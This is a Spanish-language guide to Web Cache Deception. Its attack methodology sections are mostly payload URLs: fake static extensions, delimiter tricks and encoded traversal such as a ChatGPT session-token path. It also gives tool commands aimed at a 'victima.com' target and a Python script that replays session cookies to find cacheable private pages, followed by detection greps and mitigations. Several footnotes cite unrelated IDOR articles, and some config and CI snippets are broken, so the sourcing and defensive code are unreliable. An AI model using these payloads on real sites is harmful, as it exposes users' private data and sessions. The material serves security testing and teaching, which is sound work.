# Web Cache Deception (WCD) – Guía Completa

## Resumen

Web Cache Deception es una vulnerabilidad que explota la discrepancia entre cómo un sistema de caché (CDN, proxy inverso, cache local) interpreta las rutas como estáticas y cómo el servidor origen las procesa como contenido dinámico autenticado. Si un atacante logra que el CDN almacene contenido privado como archivo “estático” (por extensión o patrón), cualquier usuario —incluido el atacante— puede recuperarlo desde la caché sin autenticación. Esto provoca filtraciones masivas de datos sensibles (perfiles, configuraciones, tokens de sesión) y compromete la confidencialidad de la aplicación.[^1]

## Contexto

Las arquitecturas web modernas usan múltiples capas de caché para mejorar el rendimiento: CDNs (Cloudflare, Fastly), proxies inversos (Varnish, Nginx), caches de aplicación (Redis). Cada capa puede tener reglas basadas en extensiones de archivo, patrones de URL o prefijos de ruta. Cuando estas reglas consideran una ruta con cierto sufijo como “estática”, almacenan la respuesta sin validar sesión ni cookies. El servidor origen, sin embargo, procesa la misma ruta como recurso dinámico y devuelve datos privados basados en la sesión autenticada del usuario.

En 2024, al menos 25 sitios del Alexa Top 5000 fueron afectados, incluyendo plataformas SaaS, servicios financieros y portales corporativos, exponiendo miles de cuentas y datos confidenciales.[^2]

## Metodología de Ataque

### 1. Descubrimiento de Endpoints Sensibles

Identificar rutas que devuelven contenido de usuario autenticado:

- Rutas de perfil: `/perfil`, `/api/user/profile`, `/dashboard`, `/settings`
- APIs de sesión: `/api/auth/session`
- Paneles administrativos: `/admin/config`, `/account/billing`

Se pueden automatizar con herramientas como Burp Suite, gau o ParamSpider para extraer URLs que requieren autenticación.

### 2. Transformaciones de URL (“Static File Rules”)

La mayoría de caches usan sufijos para decidir qué cachear. Basta con añadir una extensión estática plausible al endpoint dinámico:

```bash
/perfil          → /perfil/fake.css  
/api/user/data  → /api/user/data.js  
/dashboard      → /dashboard/style.png  
/settings       → /settings/script.json  
```

Extensiones comunes: `.css`, `.js`, `.png`, `.jpg`, `.svg`, `.txt`, `.json`, `.xml`, `.pdf`, `.woff`, `.ico`.

### 3. Delimiter Confusion

Algunos caches ignoran delimitadores mientras que el servidor origen los procesa:

```bash
/profile@fake.css    # cache ve “.css”, origen ve “/profile@fake.css”  
/profile;fake.css    # idem con punto y coma  
/profile#fake.css    # fragmento fragmento ignorado por cache  
/api/user?data.css   # cache interpreta “.css”  
```

### 4. Path Normalization Discrepancies

Aprovechar diferencias en normalización entre cache y origen:

```bash
/aaa/..%2fperfil.css     # cache normaliza a “/perfil.css”, origen a 404?  
/share/%2F..%2Fapi/auth/session.css  
```

Ejemplo real: `https://chat.openai.com/share/%2F..%2Fapi/auth/session?cachebuster=123` expuso tokens de sesión al cachear la respuesta.[^3]

### 5. Path Traversal + Static Extension

Combinar path traversal con extensiones:

```bash
/static/..%2fperfil.js   # cache cree recurso estático, origen devuelve perfil  
```

## Pruebas Manuales

1. **Autenticación**
   - Iniciar sesión con usuario legítimo y capturar sesión (cookie o header).
2. **Transformación**
   - Para cada endpoint sensible, generar rutas con extensiones estáticas y delimitadores.
3. **Petición autenticada**
   - Enviar request con sesión para que el origen responda con datos privados.
4. **Petición no autenticada**
   - Enviar la misma URL sin credenciales; si devuelve contenido similar y headers de caché (`Age`, `X-Cache`, `CF-Cache-Status: HIT`), hay WCD.
5. **Verificación**
   - Comparar tamaños y fragmentos de respuesta autenticada vs anónima.

## Automatización

### CacheSniper

```bash
git clone https://github.com/Rhynorater/CacheSniper.git
cd CacheSniper
python3 cachesniper.py -u https://victima.com -e /api/user/profile
python3 cachesniper.py -u https://victima.com -d "@,:,;,#" -e /settings
```

### Web-Cache-Vulnerability-Scanner

```bash
git clone https://github.com/Hackmanit/Web-Cache-Vulnerability-Scanner.git
cd Web-Cache-Vulnerability-Scanner
python3 wcvs.py -u https://victima.com --wcd --extensive
```

### Script Python Avanzado

```python
from urllib.parse import urljoin
import requests, time

class WCDTester:
    def __init__(self, base, cookie): 
        self.base = base.rstrip('/')
        self.s = requests.Session()
        if cookie: 
            self.s.cookies.update(cookie)
        self.exts = ['css','js','png','jpg','json']
        self.dels = ['@',';',':','#']
        self.trav = ['../','..%2f','%2e%2e%2f']
    def test(self, endpoint):
        vulns = []
        for e in self.exts:
            url = f"{self.base}{endpoint}.fake.{e}"
            a = self.s.get(url); time.sleep(1)
            b = requests.get(url)
            if a.status_code==200 and b.status_code==200 and 'cache' in str(b.headers).lower():
                vulns.append(url)
        return vulns

tester = WCDTester("https://victima.com", {'sessionid':'abc'})
for ep in ['/perfil','/api/user','/dashboard']:
    v = tester.test(ep)
    if v: print("[WCD]", v)
```

## Impacto

- **Exposición de PII:** perfiles completos, direcciones, datos bancarios.
- **Robo de tokens:** session cookies, CSRF tokens, API keys.
- **Account takeover:** encadenar con CSRF o XSS.
- **SSRF \& Request Smuggling:** redirigir el cache para leer APIs internas.

Caso real: CVE-2025-4123 en Grafana expuso configuraciones administrativas y permitió XSS+SSRF vía path traversal en redirecciones estáticas.[^5]

## Detección y Monitoreo

### Análisis de Logs

```bash
grep -E "\.(css|js|png|json)" access.log | grep -v "^/static/"
grep -E "%2f|\.\." access.log
```

### Monitoreo en tiempo real

```bash
tail -f access.log \
| grep -E "/(perfil|dashboard|api)/.*\.(css|js)" --line-buffered \
| while read l; do echo "[WCD]" $l; done
```

### CI/CD Integration

```yaml
jobs:
  wcd-scan:
    steps:
      - uses: actions/checkout@v3
      - run: pip install requests
      - run: python3 wcvs.py -u ${{ secrets.URL }} --wcd --output out.json
      - run: test ! grep -q 'vulnerable' out.json
```

## Mitigaciones

### 1. Cache Deception Armor (Cloudflare)

- Habilitar “Cache deception armor” en reglas de caché: solo cachear recursos con extensión coincidente al `Content-Type` real.[^6]

### 2. Headers de Caché Correctos

```http
Cache-Control: private, no-store, max-age=0
Pragma: no-cache
Expires: 0
```

### 3. Validación de URL Estricta

- Aceptar solo rutas permitidas sin extensiones estáticas.
- Rechazar rutas que contengan delimitadores o secuencias de traversal.

### 4. Configuración de CDN/Proxy

**Varnish VCL**

```vcl
if (req.url ~ "\.(css|js|png|jpg)$") {
  return hash;
}
if (req.url ~ "(%2f|%2e%2e|;|@)") {
  return pass;
}
```

**Nginx**

```nginx
location ~* \.(css|js|png|jpg)$ {
  allow all;
  expires 1y;
}
location / {
  add_header Cache-Control "private, no-store";
}
```

### 5. Content-Type Validation en Origen

- Rechazar respuesta con `Content-Type: text/html` para rutas con sufijos estáticos.

## Errores Comunes

- Confiar solo en whitelist de extensiones sin validar path real.
- Olvidar validación de delimitadores (`@`, `;`, `:`).
- No sincronizar reglas entre CDN y servidor origen.
- Asumir que “solo static” no procesa autenticación.

## Reporte

**Título:** Web Cache Deception – Exposición de Contenido Privado Cachéado
**Resumen:** Un atacante explota reglas de caché estáticas para almacenar contenido autenticado públicamente, filtrando datos privados.
**Pasos de Reproducción:**

1. Autenticar usuario y capturar sesión.
2. Extraer endpoint `/api/user/profile`.
3. Solicitar `/api/user/profile/fake.css` con sesión (200 OK).
4. Solicitar la misma URL sin sesión y confirmar contenido igual con headers de caché.
   **Evidencias:** Capturas de respuesta autenticada vs anónima, headers `Cache-Control`, `Age`, `X-Cache: HIT`.
   **Mitigación:** Habilitar Cache Deception Armor, validar rutas y Content-Type, deshabilitar caché para contenido dinámico.



[^1]: https://spyboy.blog/2024/09/19/idor-vulnerabilities-finding-exploiting-and-securing/
    
[^2]: https://portswigger.net/web-security/access-control/idor
    
[^3]: https://www.legitsecurity.com/aspm-knowledge-base/insecure-direct-object-references/
    
[^4]: https://www.sonicwall.com/blog/high-severity-open-redirect-vulnerability-in-grafana-leads-to-account-takeover-cve-2025-4123
    
[^5]: https://pentest-tools.com/vulnerabilities-exploits/grafana-xss-open-redirect-ssrf-via-client-path-traversal_27130
    
[^6]: https://bigid.com/blog/idor-vulnerability/
